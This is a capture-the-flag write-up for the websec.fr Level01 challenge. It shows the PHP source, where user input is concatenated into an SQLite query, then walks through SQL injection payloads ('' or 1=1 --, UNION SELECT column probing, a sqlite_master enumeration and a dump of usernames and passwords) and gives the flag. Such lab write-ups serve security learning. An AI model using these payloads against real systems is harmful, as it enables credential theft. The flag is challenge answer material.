# Level01
## Task
Challenge URL: https://websec.fr/level01/index.php  

![image](https://user-images.githubusercontent.com/44528004/132601995-9e60abba-e344-4271-83e8-3392e98229d1.png)
## Solution
### Initial observation
The `this application` links to the back-end source code including PHP and HTML. Following is the source for PHP:  
```php
<?php
session_start ();

ini_set('display_errors', 'on');
ini_set('error_reporting', E_ALL);

include 'anti_csrf.php';

init_token ();

class LevelOne {
    public function doQuery($injection) {
        $pdo = new SQLite3('database.db', SQLITE3_OPEN_READONLY);
        
        $query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1';
        $getUsers = $pdo->query($query);
        $users = $getUsers->fetchArray(SQLITE3_ASSOC);

        if ($users) {
            return $users;
        }

        return false;
    }
}

if (isset ($_POST['submit']) && isset ($_POST['user_id'])) {
    check_and_refresh_token();

    $lo = new LevelOne ();
    $userDetails = $lo->doQuery ($_POST['user_id']);
}
?>
```

Here, we can see that the query statement is prepared by concatenating user input to a predefined statement and thereby susceptible to SQL injection.  

If I enter the `user ID` as `'`, an error message is returned:  
```
Warning: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: "' LIMIT 1" in /index.php on line 16

Fatal error: Call to a member function fetchArray() on boolean in /index.php on line 17
```

If I enter '' or 1=1 --, I get this:  

![image](https://user-images.githubusercontent.com/44528004/132615026-734f4575-28eb-4e65-9bb3-da1ad6e08955.png)


### Exploitation
First, I found the number columns returned.  
When I entered `'' union select 1 --`, I got:  
```
Warning: SQLite3::query(): Unable to prepare statement: 1, SELECTs to the left and right of UNION do not have the same number of result columns in /index.php on line 16

Fatal error: Call to a member function fetchArray() on boolean in /index.php on line 17
```
This means the `SELECT` statement on the right side doesn't have the same number of columns as of the left side. Therefore, I increased the number of columns on the right side to 2 with the following payload:
```
'' union select 1, 1--
```

As a result, I got this:  

![image](https://user-images.githubusercontent.com/44528004/132615447-388b4ecc-5d20-460a-99aa-1af3365d1708.png)

This implies that there are 2 columns returned.

Next, I tried to disclose table names and column names to hopefully find something.  
From [this post](https://stackoverflow.com/questions/6460671/sqlite-schema-information-metadata), I got the payload to get the table names as well as the sql command to create that table:
```sql
SELECT name, sql FROM sqlite_master
WHERE type='table'
ORDER BY name;
```

With that payload, I got this result:  

![image](https://user-images.githubusercontent.com/44528004/132615853-0236d80c-7c0f-40a0-a7fc-df46e6d990d7.png)

From the result, I can see that there is a table called `users` and in that table there are 3 columns, namely `id`, `username`, and `password`.

Them, I wanted to see all `username`s in this table:
```sql
'' UNION SELECT username, password FROM users ORDER BY username DESC --
```

The result is:  

![image](https://user-images.githubusercontent.com/44528004/132617184-184c540e-bf7a-4f10-876f-981b272adef4.png)
> So flag: `WEBSEC{Simple_SQLite_Injection}`
